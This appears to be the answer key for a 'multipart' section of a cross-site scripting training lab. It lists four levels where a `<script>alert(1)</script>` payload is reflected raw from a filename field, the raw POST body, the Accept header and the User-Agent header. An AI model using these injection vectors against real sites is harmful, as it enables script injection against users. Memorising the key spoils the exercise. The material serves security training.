# multipart — solutions

POST body, raw JSON body, and header-based reflections.

### multipart-level1

`[POST] /multipart/level1/`

- payload: `<script>alert(1)</script>`
- body: `filename=<script>alert(1)</script>`
- context: multipart/urlencoded `filename` reflected raw in body

### multipart-level2

`[POST] /multipart/level2/`

- payload: `<script>alert(1)</script>`
- body: `<script>alert(1)</script>`
- context: raw request body echoed into HTML body

### multipart-level3

`[Header] /multipart/level3/?query=a`

- payload: `<script>alert(1)</script>`
- header: `Accept: <script>alert(1)</script>`
- context: Accept header reflected raw in body

### multipart-level4

`[Header] /multipart/level4/?query=a`

- payload: `<script>alert(1)</script>`
- header: `User-Agent: <script>alert(1)</script>`
- context: User-Agent reflected raw in body
